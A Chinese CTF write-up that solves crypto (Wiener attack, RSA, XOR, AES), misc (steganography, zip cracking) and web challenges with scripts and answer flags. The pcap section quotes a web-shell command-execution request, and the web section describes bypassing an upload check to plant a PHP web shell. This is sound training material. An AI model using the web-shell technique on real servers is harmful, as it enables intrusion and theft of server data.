<h2 id="Caesar’s-Secert"><a href="#Caesar’s-Secert" class="headerlink" title="Caesar’s Secert"></a>Caesar’s Secert</h2><p>想到偏移量，凯撒密码，<a target="_blank" rel="noopener" href="https://ctf.bugku.com/tool/caesar">https://ctf.bugku.com/tool/caesar</a> 偏移5解出flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ca3s4r&#x27;s_c1pher_i5_v4ry_3azy&#125;</span><br></pre></td></tr></table></figure>



<h2 id="Fence"><a href="#Fence" class="headerlink" title="Fence"></a>Fence</h2><p>栅栏密码 <a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/zhalanmima.php">https://www.qqxiuzi.cn/bianma/zhalanmima.php</a> 解密</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;reordering_the_plaintext#686f8c03&#125;</span><br></pre></td></tr></table></figure>



<h2 id="Vigenere"><a href="#Vigenere" class="headerlink" title="Vigenère"></a>Vigenère</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">vigenere_decrypt_single</span>(<span class="params">char_ciphertext, char_plaintext</span>):</span><br><span class="line">    alphabet = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">    index_ciphertext = alphabet.index(char_ciphertext)</span><br><span class="line">    index_plaintext = alphabet.index(char_plaintext)</span><br><span class="line">    index_key = (index_ciphertext - index_plaintext) % <span class="number">26</span></span><br><span class="line">    <span class="keyword">return</span> alphabet[index_key]</span><br><span class="line"></span><br><span class="line">ciphertext = <span class="string">&quot;pqcq&quot;</span></span><br><span class="line">plaintext = <span class="string">&quot;flag&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;&quot;</span>.join([vigenere_decrypt_single(ciphertext[i], plaintext[i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)])</span><br><span class="line"><span class="built_in">print</span>(key)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>跑出来是kfck, 猜测是kfckfc，用kfc解密后拿到flag</p>
<p>flag{la_c1fr4_del_5ign0r_giovan_batt1st4_b3ll5s0}</p>
<h2 id="babyrsa"><a href="#babyrsa" class="headerlink" title="babyrsa"></a>babyrsa</h2><p>Q&amp;A:</p>
<p>1选择N &#x3D; p * q是因为N有能够唯一分解成p q两个因子的特性</p>
<p>2为什么φ(p) &#x3D;(p-1)？</p>
<p>是因为p是素数这个特性，所以和p互质的数是p-1个</p>
<p>3 ed≡1(mod φ(N)) 这个是根据扩欧几里得推导出来的</p>
<p>扩欧几里得的定义是 能找到整数x ，y 使得ax + by &#x3D; gcd(a,b)</p>
<p>e和d是互质的，所以使得 ex + φ(N)y &#x3D; 1 然后φ(N)y &#x3D; 0，所以就算出ed≡1(mod φ(N))  </p>
<p><a target="_blank" rel="noopener" href="http://www.factordb.com/index.php">http://www.factordb.com/index.php</a> 可以用这个在线的网站分解n，然后求phi n，通过phi n求e的逆元d解密</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算phi n</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_phi_n</span>(<span class="params">factors</span>):</span><br><span class="line">    phi_n = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> factors:</span><br><span class="line">        phi_n *= (p - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> phi_n</span><br><span class="line"></span><br><span class="line"><span class="comment"># 求逆元</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modinv</span>(<span class="params">a, m</span>):</span><br><span class="line">    g, x, y = extended_gcd(a, m)</span><br><span class="line">    <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extended_gcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = extended_gcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsa_decrypt</span>(<span class="params">c, n, e, factors</span>):</span><br><span class="line">    phi_n = calculate_phi_n(factors)</span><br><span class="line">    d = modinv(e, phi_n)</span><br><span class="line">    m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">    <span class="keyword">return</span> long_to_bytes(m).decode()</span><br><span class="line"></span><br><span class="line">n = <span class="number">17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">14322038433761655404678393568158537849783589481463521075694802654611048898878605144663750410655734675423328256213114422929994037240752995363595</span></span><br><span class="line">factors = [</span><br><span class="line">    <span class="number">2217990919</span>, <span class="number">2338725373</span>, <span class="number">2370292207</span>, <span class="number">2463878387</span>, <span class="number">2706073949</span>,</span><br><span class="line">    <span class="number">2794985117</span>, <span class="number">2804303069</span>, <span class="number">2923072267</span>, <span class="number">2970591037</span>, <span class="number">3207148519</span>,</span><br><span class="line">    <span class="number">3654864131</span>, <span class="number">3831680819</span>, <span class="number">3939901243</span>, <span class="number">4093178561</span>, <span class="number">4278428893</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">decrypted_message = rsa_decrypt(c, n, e, factors)</span><br><span class="line"><span class="built_in">print</span>(decrypted_message)</span><br></pre></td></tr></table></figure>



<h2 id="babyencoding"><a href="#babyencoding" class="headerlink" title="babyencoding"></a>babyencoding</h2><p>part1 和part2有&#x3D;号，然后part1是大小写字母加数字，2是纯大写字母，应该是base64和32.</p>
<p>part3搜了好久，在这篇文章中找到了<a target="_blank" rel="noopener" href="https://blog.csdn.net/Retrovich/article/details/90313591">https://blog.csdn.net/Retrovich/article/details/90313591</a> 是uuencode编码，在线解密拼接得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;dazzling_encoding#4e0ad4f0ca08d1e1d0f10c0c7afe422fea7c55192c992036ef623372601ff3a&#125;</span><br></pre></td></tr></table></figure>

<p>后面去看了一下群里的crypto入门的文档，发现里面就有uuencode的识别方法</p>
<h2 id="Small-d"><a href="#Small-d" class="headerlink" title="Small d"></a>Small d</h2><p>Michael J. Wiener 觉得很赞 这个搜了一下，有一种针对small d的攻击方式叫维纳攻击</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/rreally/article/details/111092579">https://blog.csdn.net/rreally/article/details/111092579</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">transform</span>(<span class="params">x, y</span>):  <span class="comment"># 使用辗转相处将分数 x/y 转为连分数的形式</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">while</span> y:</span><br><span class="line">        res.append(x // y)</span><br><span class="line">        x, y = y, x % y</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">continued_fraction</span>(<span class="params">sub_res</span>):</span><br><span class="line">    numerator, denominator = <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> sub_res[::-<span class="number">1</span>]:  <span class="comment"># 从sublist的后面往前循环</span></span><br><span class="line">        denominator, numerator = numerator, i * numerator + denominator</span><br><span class="line">    <span class="keyword">return</span> denominator, numerator  <span class="comment"># 得到渐进分数的分母和分子，并返回</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 求解每个渐进分数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_fraction</span>(<span class="params">x, y</span>):</span><br><span class="line">    res = transform(x, y)</span><br><span class="line">    res = <span class="built_in">list</span>(<span class="built_in">map</span>(continued_fraction, (res[<span class="number">0</span>:i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(res)))))  <span class="comment"># 将连分数的结果逐一截取以求渐进分数</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_pq</span>(<span class="params">a, b, c</span>):  <span class="comment"># 由p+q和pq的值通过维达定理来求解p和q</span></span><br><span class="line">    par = gmpy2.isqrt(b * b - <span class="number">4</span> * a * c)  <span class="comment"># 由上述可得，开根号一定是整数，因为有解</span></span><br><span class="line">    x1, x2 = (-b + par) // (<span class="number">2</span> * a), (-b - par) // (<span class="number">2</span> * a)</span><br><span class="line">    <span class="keyword">return</span> x1, x2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wienerAttack</span>(<span class="params">e, n</span>):</span><br><span class="line">    <span class="keyword">for</span> (d, k) <span class="keyword">in</span> sub_fraction(e, n):  <span class="comment"># 用一个for循环来注意试探e/n的连续函数的渐进分数，直到找到一个满足条件的渐进分数</span></span><br><span class="line">        <span class="keyword">if</span> k == <span class="number">0</span>:  <span class="comment"># 可能会出现连分数的第一个为0的情况，排除</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> (e * d - <span class="number">1</span>) % k != <span class="number">0</span>:  <span class="comment"># ed=1 (mod φ(n)) 因此如果找到了d的话，(ed-1)会整除φ(n),也就是存在k使得(e*d-1)//k=φ(n)</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        phi = (e * d - <span class="number">1</span>) // k  <span class="comment"># 这个结果就是 φ(n)</span></span><br><span class="line">        px, qy = get_pq(<span class="number">1</span>, n - phi + <span class="number">1</span>, n)</span><br><span class="line">        <span class="keyword">if</span> px * qy == n:</span><br><span class="line">            p, q = <span class="built_in">abs</span>(<span class="built_in">int</span>(px)), <span class="built_in">abs</span>(<span class="built_in">int</span>(qy))  <span class="comment"># 可能会得到两个负数，负负得正未尝不会出现</span></span><br><span class="line">            d = gmpy2.invert(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))  <span class="comment"># 求ed=1 (mod  φ(n))的结果，也就是e关于 φ(n)的乘法逆元d</span></span><br><span class="line">            <span class="keyword">return</span> d</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;该方法不适用&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = <span class="number">8614531087131806536072176126608505396485998912193090420094510792595101158240453985055053653848556325011409922394711124558383619830290017950912353027270400567568622816245822324422993074690183971093882640779808546479195604743230137113293752897968332220989640710311998150108315298333817030634179487075421403617790823560886688860928133117536724977888683732478708628314857313700596522339509581915323452695136877802816003353853220986492007970183551041303875958750496892867954477510966708935358534322867404860267180294538231734184176727805289746004999969923736528783436876728104351783351879340959568183101515294393048651825</span></span><br><span class="line">n = <span class="number">19873634983456087520110552277450497529248494581902299327237268030756398057752510103012336452522030173329321726779935832106030157682672262548076895370443461558851584951681093787821035488952691034250115440441807557595256984719995983158595843451037546929918777883675020571945533922321514120075488490479009468943286990002735169371404973284096869826357659027627815888558391520276866122370551115223282637855894202170474955274129276356625364663165723431215981184996513023372433862053624792195361271141451880123090158644095287045862204954829998614717677163841391272754122687961264723993880239407106030370047794145123292991433</span></span><br><span class="line">d = wienerAttack(e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;d=&quot;</span>, d)</span><br></pre></td></tr></table></figure>

<p>求出d后解密flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = <span class="number">6755916696778185952300108824880341673727005249517850628424982499865744864158808968764135637141068930913626093598728925195859592078242679206690525678584698906782028671968557701271591419982370839581872779561897896707128815668722609285484978303216863236997021197576337940204757331749701872808443246927772977500576853559531421931943600185923610329322219591977644573509755483679059951426686170296018798771243136530651597181988040668586240449099412301454312937065604961224359235038190145852108473520413909014198600434679037524165523422401364208450631557380207996597981309168360160658308982745545442756884931141501387954248</span></span><br><span class="line">e = <span class="number">8614531087131806536072176126608505396485998912193090420094510792595101158240453985055053653848556325011409922394711124558383619830290017950912353027270400567568622816245822324422993074690183971093882640779808546479195604743230137113293752897968332220989640710311998150108315298333817030634179487075421403617790823560886688860928133117536724977888683732478708628314857313700596522339509581915323452695136877802816003353853220986492007970183551041303875958750496892867954477510966708935358534322867404860267180294538231734184176727805289746004999969923736528783436876728104351783351879340959568183101515294393048651825</span></span><br><span class="line">n = <span class="number">19873634983456087520110552277450497529248494581902299327237268030756398057752510103012336452522030173329321726779935832106030157682672262548076895370443461558851584951681093787821035488952691034250115440441807557595256984719995983158595843451037546929918777883675020571945533922321514120075488490479009468943286990002735169371404973284096869826357659027627815888558391520276866122370551115223282637855894202170474955274129276356625364663165723431215981184996513023372433862053624792195361271141451880123090158644095287045862204954829998614717677163841391272754122687961264723993880239407106030370047794145123292991433</span></span><br><span class="line">d = <span class="number">2357048593</span></span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(flag))</span><br></pre></td></tr></table></figure>





<h2 id="babyxor"><a href="#babyxor" class="headerlink" title="babyxor"></a>babyxor</h2><p>flag按字节异或上f，需要爆破f，f的范围是一个字节0-255，把0-255按字节异或上c跑一遍就好了</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="string">&quot;e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2&quot;</span></span><br><span class="line">c = <span class="built_in">bytes</span>.fromhex(c)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    flag = <span class="built_in">bytes</span>([b ^ key <span class="keyword">for</span> b <span class="keyword">in</span> c])</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;flag&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>



<h2 id="Affine"><a href="#Affine" class="headerlink" title="Affine"></a>Affine</h2><p>仿射密码，这里要求解的问题是 置反(key[0]*f + key[1]) % modulus 这个操作</p>
<p>可以简化成m &#x3D; (c -key[1]) * key[0]的模逆，用扩欧几里得来求模逆</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"></span><br><span class="line">c = <span class="string">&quot;dd4388ee428bdddd5865cc66aa5887ffcca966109c66edcca920667a88312064&quot;</span></span><br><span class="line">c = <span class="built_in">bytes</span>.fromhex(c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 求模逆</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modinv</span>(<span class="params">a, m</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, m):</span><br><span class="line">        <span class="keyword">if</span> (a * i) % m == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k0, k1 <span class="keyword">in</span> product(<span class="built_in">range</span>(<span class="number">256</span>), repeat=<span class="number">2</span>):</span><br><span class="line">    k0_inv = modinv(k0, <span class="number">256</span>)</span><br><span class="line">    <span class="keyword">if</span> k0_inv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    decrypted = []</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> c:</span><br><span class="line">        f = ((b - k1) * k0_inv) % <span class="number">256</span></span><br><span class="line">        decrypted.append(f)</span><br><span class="line"></span><br><span class="line">    flag = <span class="built_in">str</span>(<span class="built_in">bytes</span>(decrypted))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>



<h2 id="babyaes"><a href="#babyaes" class="headerlink" title="babyaes"></a>babyaes</h2><p>key是由两个相同的长度16字节的字符串组成，bytes_to_long(key) ^ bytes_to_long(iv) ^ 1这里只异或了key的16字节，所以可以算出key，然后用key的低位异或可以算出iv,用iv 和key 使用aes cbc mode就能解出flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">xor = <span class="number">3657491768215750635844958060963805125333761387746954618540958489914964573229</span></span><br><span class="line">flag = <span class="string">b&#x27;&gt;]\xc1\xe5\x82/\x02\x7ft\xf1B\x8d\n\xc1\x95i&#x27;</span></span><br><span class="line">xor = long_to_bytes(xor)</span><br><span class="line">key = xor[:<span class="number">16</span>]*<span class="number">2</span></span><br><span class="line"></span><br><span class="line">iv = bytes_to_long(key[<span class="number">16</span>:]) ^ bytes_to_long(xor[<span class="number">16</span>:])</span><br><span class="line">iv = long_to_bytes(iv)</span><br><span class="line"></span><br><span class="line">aes = AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">flag = aes.decrypt(flag)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>



<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="CyberChef’s-Secret"><a href="#CyberChef’s-Secret" class="headerlink" title="CyberChef’s Secret"></a>CyberChef’s Secret</h2><p>base32 -&gt; base58 -&gt;base64</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Base_15_S0_Easy_^_^&#125;</span><br></pre></td></tr></table></figure>



<h2 id="机密图片"><a href="#机密图片" class="headerlink" title="机密图片"></a>机密图片</h2><p>lsb隐写</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;W3lc0m3_t0_N3wSt4RCTF_2023_7cda3ece&#125;</span><br></pre></td></tr></table></figure>



<h2 id="流量！鲨鱼！"><a href="#流量！鲨鱼！" class="headerlink" title="流量！鲨鱼！"></a>流量！鲨鱼！</h2><p>看了一下，很多无用http的数据包 用http.response.code &#x3D;&#x3D; 200筛选后，找到这个</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">GET /1.php?cmd=base64%20/.ffffllllllll11111144444GGGGGG|base64 HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5666.197 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Cookie: PHPSESSID=85usgbksv9rn85kdcsgu5j0903</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">sec-ch-ua: &quot;Google Chrome&quot;;v=&quot;113&quot;, &quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not=A?Brand&quot;;v=&quot;24&quot;</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Sat, 19 Aug 2023 06:20:45 GMT</span><br><span class="line">Server: Apache/2.4.51 (Debian)</span><br><span class="line">X-Powered-By: PHP/7.3.33</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Content-Encoding: gzip</span><br><span class="line">Keep-Alive: timeout=5, max=100</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">Wm14aFozdFhjbWt6TldnMGNtdGZNWE5mZFRVelpuVnNYMkkzTW1FMk1EazFNemRsTm4wSwo=</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后base64解密两次，拿到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Wri35h4rk_1s_u53ful_b72a609537e6&#125;</span><br></pre></td></tr></table></figure>



<h2 id="压缩包们"><a href="#压缩包们" class="headerlink" title="压缩包们"></a>压缩包们</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Hardworking666/p/15866121.html">https://www.cnblogs.com/Hardworking666/p/15866121.html</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/q20010619/article/details/109425270">https://blog.csdn.net/q20010619/article/details/109425270</a></p>
<p>搜了一下，缺个zip头 <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_29566629/article/details/122936177">https://blog.csdn.net/qq_29566629/article/details/122936177</a> </p>
<p>加上50 4B 03 04后解压，发现结尾有一串base64编码，解密后提示密码是6位数的，</p>
<p>用ARCHPR破解有些问题，搜了一下装了一个Ziperello，破解后拿到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;y0u_ar3_the_m4ter_of_z1111ppp_606a4adc&#125;</span><br></pre></td></tr></table></figure>



<h2 id="空白格"><a href="#空白格" class="headerlink" title="空白格"></a>空白格</h2><p>在这篇文章找到了解决方法 </p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51999772/article/details/122418926">https://blog.csdn.net/qq_51999772/article/details/122418926</a></p>
<p><a target="_blank" rel="noopener" href="https://vii5ard.github.io/whitespace/">https://vii5ard.github.io/whitespace/</a></p>
<p>运行得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;w3_h4v3_to0_m4ny_wh1t3_sp4ce_2a5b4e04&#125;</span><br></pre></td></tr></table></figure>



<h2 id="隐秘的眼睛"><a href="#隐秘的眼睛" class="headerlink" title="隐秘的眼睛"></a>隐秘的眼睛</h2><p>silenteye 下载这个工具，然后解密拿到flag</p>
<p><a target="_blank" rel="noopener" href="https://www.sqlsec.com/2018/01/ctfwav.html#SilentEye">https://www.sqlsec.com/2018/01/ctfwav.html#SilentEye</a> </p>
<p><a target="_blank" rel="noopener" href="https://achorein.github.io/silenteye/">https://achorein.github.io/silenteye/</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;R0ck1ng_y0u_63b0dc13a591&#125;</span><br></pre></td></tr></table></figure>



<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="泄漏的秘密"><a href="#泄漏的秘密" class="headerlink" title="泄漏的秘密"></a>泄漏的秘密</h2><p>用dirmap 发现有个<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a> 和robot 拼接index中的flag和robots的flag后得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;r0bots_1s_s0_us3ful_4nd_www.zip_1s_s0_d4ng3rous&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Begin-of-Upload"><a href="#Begin-of-Upload" class="headerlink" title="Begin of Upload"></a>Begin of Upload</h2><p>有段js的代码检测上传的类型，在firefox里面把js禁用后就能上传php文件了</p>
<p>用一句话木马加蚁剑在根目录下找到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;e9ed8544-e37e-4c4a-ac21-d7cacf157dbf&#125;</span><br></pre></td></tr></table></figure>

